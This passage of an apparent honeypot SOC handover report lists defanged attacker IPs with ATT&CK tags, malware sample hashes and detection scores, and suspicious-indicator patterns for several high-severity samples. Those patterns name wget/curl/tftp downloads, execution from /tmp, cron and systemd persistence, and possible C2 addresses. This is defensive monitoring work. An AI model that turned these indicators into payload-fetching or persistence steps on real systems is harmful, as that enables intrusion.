| `14.49.180[.]118` | 1 | 2026-10-03 08:01 | 2026-10-03 08:01 | 25s | 0 | `T1592` | 🟢 LOW |
| `165.227.62[.]247` | 1 | 2026-10-03 13:38 | 2026-10-03 13:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `168.181.217[.]179` | 1 | 2026-10-03 06:17 | 2026-10-03 06:17 | 0s | 0 | `T1592` | 🟢 LOW |
| `172.104.11[.]34` | 1 | 2026-10-03 01:37 | 2026-10-03 01:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `172.104.11[.]4` | 1 | 2026-10-03 03:46 | 2026-10-03 03:46 | 0s | 0 | `T1592` | 🟢 LOW |
| `172.235.41[.]110` | 1 | 2026-10-03 05:03 | 2026-10-03 05:03 | 0s | 0 | `T1592` | 🟢 LOW |
| `172.236.228[.]222` | 1 | 2026-10-03 09:35 | 2026-10-03 09:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `172.236.228[.]86` | 1 | 2026-10-03 12:34 | 2026-10-03 12:34 | 0s | 0 | `T1592` | 🟢 LOW |
| `174.138.49[.]97` | 1 | 2026-10-03 03:36 | 2026-10-03 03:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `175.202.194[.]168` | 1 | 2026-10-03 07:05 | 2026-10-03 07:05 | 17s | 0 | `T1592` | 🟢 LOW |
| `18.218.118[.]203` | 1 | 2026-10-03 14:29 | 2026-10-03 14:29 | 0s | 0 | `T1592` | 🟢 LOW |
| `180.106.83[.]59` | 1 | 2026-10-03 03:05 | 2026-10-03 03:07 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.184.160[.]211` | 1 | 2026-10-03 03:21 | 2026-10-03 03:21 | 1s | 0 | `T1592` | 🟢 LOW |
| `180.93.99[.]150` | 1 | 2026-10-03 06:56 | 2026-10-03 06:56 | 0s | 0 | `T1592` | 🟢 LOW |
| `185.181.18[.]160` | 1 | 2026-10-03 11:18 | 2026-10-03 11:19 | 13s | 0 | `T1592` | 🟢 LOW |
| `185.95.229[.]211` | 1 | 2026-10-03 07:51 | 2026-10-03 07:51 | 13s | 0 | `T1592` | 🟢 LOW |
| `188.177.120[.]76` | 1 | 2026-10-03 06:49 | 2026-10-03 06:49 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.112.192[.]91` | 1 | 2026-10-03 02:26 | 2026-10-03 02:27 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `193.112.192[.]91` | 1 | 2026-10-03 10:22 | 2026-10-03 10:22 | 6s | 0 | `T1592` | 🟢 LOW |
| `194.54.161[.]214` | 1 | 2026-10-03 05:34 | 2026-10-03 05:34 | 17s | 0 | `T1592` | 🟢 LOW |
| `194.88.98[.]123` | 1 | 2026-10-03 14:22 | 2026-10-03 14:22 | 0s | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]218` | 1 | 2026-10-03 06:55 | 2026-10-03 06:55 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `195.178.110[.]26` | 1 | 2026-10-03 05:24 | 2026-10-03 05:24 | 0s | 0 | `T1592` | 🟢 LOW |
| `195.96.139[.]36` | 1 | 2026-10-03 05:40 | 2026-10-03 05:40 | 2s | 0 | `T1592` | 🟢 LOW |
| `2.57.122[.]168` | 1 | 2026-10-03 02:13 | 2026-10-03 02:13 | 0s | 0 | `T1592` | 🟢 LOW |
| `20.64.98[.]133` | 1 | 2026-10-03 13:39 | 2026-10-03 13:39 | 10s | 0 | `T1592` | 🟢 LOW |
| `20.65.170[.]203` | 1 | 2026-10-03 02:28 | 2026-10-03 02:28 | 10s | 0 | `T1592` | 🟢 LOW |
| `200.59.127[.]178` | 1 | 2026-10-03 11:23 | 2026-10-03 11:23 | 10s | 0 | `T1592` | 🟢 LOW |
| `202.103.157[.]115` | 1 | 2026-10-03 09:41 | 2026-10-03 09:43 | 120s | 0 | `T1592` | 🟢 LOW |
| `207.175.170[.]210` | 1 | 2026-10-03 02:29 | 2026-10-03 02:29 | 1s | 0 | `T1592` | 🟢 LOW |
| `209.54.105[.]253` | 1 | 2026-10-03 13:37 | 2026-10-03 13:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `213.174.10[.]241` | 1 | 2026-10-03 07:37 | 2026-10-03 07:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `213.230.86[.]12` | 1 | 2026-10-03 14:39 | 2026-10-03 14:39 | 0s | 0 | `T1592` | 🟢 LOW |
| `24.168.118[.]107` | 1 | 2026-10-03 02:16 | 2026-10-03 02:16 | 17s | 0 | `T1592` | 🟢 LOW |
| `27.222.91[.]119` | 1 | 2026-10-03 05:02 | 2026-10-03 05:02 | 11s | 0 | `T1592` | 🟢 LOW |
| `3.129.187[.]38` | 1 | 2026-10-03 06:37 | 2026-10-03 06:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `34.228.60[.]106` | 1 | 2026-10-03 00:58 | 2026-10-03 00:58 | 2s | 0 | `T1592` | 🟢 LOW |
| `34.62.254[.]48` | 1 | 2026-10-03 03:26 | 2026-10-03 03:26 | 0s | 0 | `T1592` | 🟢 LOW |
| `34.76.244[.]144` | 1 | 2026-10-03 02:18 | 2026-10-03 02:18 | 7s | 0 | `T1592` | 🟢 LOW |
| `34.78.189[.]3` | 1 | 2026-10-03 02:54 | 2026-10-03 02:54 | 1s | 0 | `T1592` | 🟢 LOW |
| `35.240.2[.]89` | 1 | 2026-10-03 03:25 | 2026-10-03 03:26 | 6s | 0 | `T1592` | 🟢 LOW |
| `36.103.243[.]179` | 1 | 2026-10-03 12:54 | 2026-10-03 12:56 | 103s | 0 | `T1592` | 🟢 LOW |
| `36.136.66[.]44` | 1 | 2026-10-03 04:11 | 2026-10-03 04:13 | 120s | 0 | `T1592` | 🟢 LOW |
| `36.137.249[.]148` | 1 | 2026-10-03 13:52 | 2026-10-03 13:54 | 120s | 0 | `T1592` | 🟢 LOW |
| `36.141.79[.]94` | 1 | 2026-10-03 11:14 | 2026-10-03 11:16 | 93s | 0 | `T1592` | 🟢 LOW |
| `36.26.74[.]162` | 1 | 2026-10-03 05:54 | 2026-10-03 05:56 | 120s | 0 | `T1592` | 🟢 LOW |
| `4.148.240[.]242` | 1 | 2026-10-03 14:08 | 2026-10-03 14:08 | 9s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]151` | 1 | 2026-10-03 07:04 | 2026-10-03 07:04 | 1s | 0 | `T1592` | 🟢 LOW |
| `45.33.109[.]18` | 1 | 2026-10-03 03:45 | 2026-10-03 03:45 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.33.109[.]18` | 1 | 2026-10-03 08:35 | 2026-10-03 08:35 | 5s | 0 | `T1592` | 🟢 LOW |
| `45.33.109[.]8` | 1 | 2026-10-03 07:36 | 2026-10-03 07:36 | 5s | 0 | `T1592` | 🟢 LOW |
| `45.33.12[.]214` | 1 | 2026-10-03 01:36 | 2026-10-03 01:36 | 4s | 0 | `T1592` | 🟢 LOW |
| `45.33.14[.]5` | 1 | 2026-10-03 14:35 | 2026-10-03 14:35 | 1s | 0 | `T1592` | 🟢 LOW |
| `45.79.128[.]205` | 1 | 2026-10-03 13:35 | 2026-10-03 13:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.181[.]179` | 1 | 2026-10-03 02:46 | 2026-10-03 02:46 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]111` | 1 | 2026-10-03 13:35 | 2026-10-03 13:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]129` | 1 | 2026-10-03 05:36 | 2026-10-03 05:36 | 1s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]129` | 1 | 2026-10-03 07:37 | 2026-10-03 07:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]252` | 1 | 2026-10-03 06:38 | 2026-10-03 06:38 | 1s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]71` | 1 | 2026-10-03 08:35 | 2026-10-03 08:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.211[.]97` | 1 | 2026-10-03 09:34 | 2026-10-03 09:34 | 0s | 0 | `T1592` | 🟢 LOW |
| `46.100.134[.]114` | 1 | 2026-10-03 12:02 | 2026-10-03 12:02 | 26s | 0 | `T1592` | 🟢 LOW |
| `46.164.132[.]34` | 1 | 2026-10-03 08:54 | 2026-10-03 08:54 | 0s | 0 | `T1592` | 🟢 LOW |
| `46.173.96[.]208` | 1 | 2026-10-03 08:19 | 2026-10-03 08:19 | 0s | 0 | `T1592` | 🟢 LOW |
| `46.98.61[.]30` | 1 | 2026-10-03 02:03 | 2026-10-03 02:03 | 12s | 0 | `T1592` | 🟢 LOW |
| `47.251.247[.]182` | 1 | 2026-10-03 05:20 | 2026-10-03 05:20 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.124.151[.]25` | 1 | 2026-10-03 12:18 | 2026-10-03 12:18 | 0s | 0 | `T1592` | 🟢 LOW |
| `5.165.93[.]180` | 1 | 2026-10-03 04:32 | 2026-10-03 04:32 | 18s | 0 | `T1592` | 🟢 LOW |
| `50.116.26[.]161` | 1 | 2026-10-03 12:33 | 2026-10-03 12:33 | 1s | 0 | `T1592` | 🟢 LOW |
| `51.158.205[.]203` | 1 | 2026-10-03 04:45 | 2026-10-03 04:45 | 0s | 0 | `T1592` | 🟢 LOW |
| `51.8.96[.]184` | 1 | 2026-10-03 12:44 | 2026-10-03 12:44 | 0s | 0 | `T1592` | 🟢 LOW |
| `58.222.244[.]226` | 1 | 2026-10-03 05:42 | 2026-10-03 05:44 | 120s | 0 | `T1592` | 🟢 LOW |
| `59.6.18[.]50` | 1 | 2026-10-03 08:06 | 2026-10-03 08:06 | 29s | 0 | `T1592` | 🟢 LOW |
| `60.188.249[.]64` | 1 | 2026-10-03 01:20 | 2026-10-03 01:20 | 8s | 0 | `T1592` | 🟢 LOW |
| `61.185.30[.]170` | 1 | 2026-10-03 12:54 | 2026-10-03 12:54 | 0s | 0 | `T1592` | 🟢 LOW |
| `62.60.130[.]253` | 1 | 2026-10-03 01:02 | 2026-10-03 01:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `62.60.130[.]253` | 1 | 2026-10-03 10:02 | 2026-10-03 10:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.62.156[.]38` | 1 | 2026-10-03 10:22 | 2026-10-03 10:22 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]167` | 1 | 2026-10-03 01:49 | 2026-10-03 01:49 | 2s | 0 | `T1592` | 🟢 LOW |
| `64.89.160[.]135` | 1 | 2026-10-03 07:09 | 2026-10-03 07:09 | 0s | 0 | `T1592` | 🟢 LOW |
| `65.49.1[.]108` | 1 | 2026-10-03 01:53 | 2026-10-03 01:53 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]109` | 1 | 2026-10-03 08:53 | 2026-10-03 08:54 | 16s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]110` | 1 | 2026-10-03 03:05 | 2026-10-03 03:05 | 19s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]143` | 1 | 2026-10-03 13:48 | 2026-10-03 13:49 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]187` | 1 | 2026-10-03 09:57 | 2026-10-03 09:58 | 17s | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]206` | 1 | 2026-10-03 08:54 | 2026-10-03 08:54 | 20s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]105` | 1 | 2026-10-03 04:04 | 2026-10-03 04:04 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]117` | 1 | 2026-10-03 09:57 | 2026-10-03 09:57 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]61` | 1 | 2026-10-03 08:52 | 2026-10-03 08:52 | 16s | 0 | `T1592` | 🟢 LOW |
| `66.228.53[.]157` | 1 | 2026-10-03 06:29 | 2026-10-03 06:29 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.228.62[.]150` | 1 | 2026-10-03 02:45 | 2026-10-03 02:45 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.228.62[.]150` | 1 | 2026-10-03 05:36 | 2026-10-03 05:36 | 1s | 0 | `T1592` | 🟢 LOW |
| `69.5.169[.]143` | 1 | 2026-10-03 09:28 | 2026-10-03 09:28 | 0s | 0 | `T1592` | 🟢 LOW |
| `69.5.169[.]171` | 1 | 2026-10-03 14:22 | 2026-10-03 14:23 | 9s | 0 | `T1592` | 🟢 LOW |
| `72.14.178[.]148` | 1 | 2026-10-03 06:38 | 2026-10-03 06:38 | 4s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]121` | 1 | 2026-10-03 13:09 | 2026-10-03 13:09 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-10-03 01:30 | 2026-10-03 01:30 | 1s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-10-03 13:26 | 2026-10-03 13:26 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]70` | 1 | 2026-10-03 12:16 | 2026-10-03 12:16 | 0s | 0 | `T1592` | 🟢 LOW |
| `82.194.44[.]110` | 1 | 2026-10-03 06:16 | 2026-10-03 06:16 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]19` | 1 | 2026-10-03 08:44 | 2026-10-03 08:44 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]8` | 1 | 2026-10-03 08:45 | 2026-10-03 08:45 | 0s | 0 | `T1592` | 🟢 LOW |
| `89.21.67[.]179` | 1 | 2026-10-03 09:27 | 2026-10-03 09:27 | 0s | 0 | `T1592` | 🟢 LOW |
| `91.225.162[.]230` | 1 | 2026-10-03 13:34 | 2026-10-03 13:36 | 120s | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]49` | 1 | 2026-10-03 12:50 | 2026-10-03 12:50 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `93.123.109[.]6` | 1 | 2026-10-03 05:16 | 2026-10-03 05:16 | 0s | 0 | `T1592` | 🟢 LOW |
| `93.123.109[.]6` | 1 | 2026-10-03 07:24 | 2026-10-03 07:24 | 0s | 0 | `T1592` | 🟢 LOW |
| `93.123.109[.]6` | 1 | 2026-10-03 13:25 | 2026-10-03 13:25 | 0s | 0 | `T1592` | 🟢 LOW |
| `94.154.43[.]69` | 1 | 2026-10-03 12:05 | 2026-10-03 12:05 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `062ba629c7b2b914b289c8da0573c179fe86f2cb1f70a31f9a1400d563c3042a` | ELF Binary (Linux executable) (x86-64 64-bit) | `062ba629c7b2b914...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` | ELF Binary (Linux executable) (ARM 32-bit) | `07c0a0af63dde8dc...` | 86/100 | 🔴 HIGH | **40/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `13960b7e69159907f67f84ce6398d29f73686602ef2c36d837237288f4fe8785` | Bash Script | `13960b7e69159907...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `1946ee7ec655de32199ce87390699db1e18d80438bdf01f3b813a929e5cce4e6` | ELF Binary (Linux executable) (MIPS 32-bit) | `1946ee7ec655de32...` | 58/100 | 🟡 MEDIUM | **45/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 38/100 | 🟢 LOW | **21/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |

**Suspicious Indicators — HIGH Severity Samples:**

_`07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` (07c0a0af63dde8dc2e36dc58...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `72.14.178[.]148` | US | Linode | **100** ⚠️ | 50 |
| `35.244.32[.]167` | IN | Google LLC | **100** ⚠️ | 10 |
| `45.79.207[.]111` | US | Linode | **100** ⚠️ | 50 |
| `34.228.60[.]106` | US | Amazon Technologies Inc. | **100** ⚠️ | 22 |
| `172.252.13[.]101` | US | Subnet Digital LLC | **100** ⚠️ | 20 |
| `206.72.195[.]47` | US | Interserver, Inc | **100** ⚠️ | 1 |
| `46.98.61[.]30` | UA | FREGAT | **100** ⚠️ | 2 |
| `20.64.98[.]133` | US | Microsoft Corporation | **100** ⚠️ | 3 |
| `45.33.109[.]8` | US | Linode | **100** ⚠️ | 50 |
| `172.236.228[.]86` | US | Linode | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 255 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 207 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 64 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 59 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 13 |

---

## 🔕 False Positive Summary (43 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 13 |
| AbuseIPDB score 15 below threshold 25 | 1 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| AbuseIPDB score 17 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 6 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 20 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 397 cases |
| Tool 34  | Credential Extractor        | ✅ 3375 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 30 fingerprints |
| Tool 36  | Command Clustering          | ✅ 20 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 255 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 43 filtered (10.8%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 110 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 24 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 207 priority case(s) shown individually · 138 recon entry/entries in table (5 group(s) consolidating 14 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

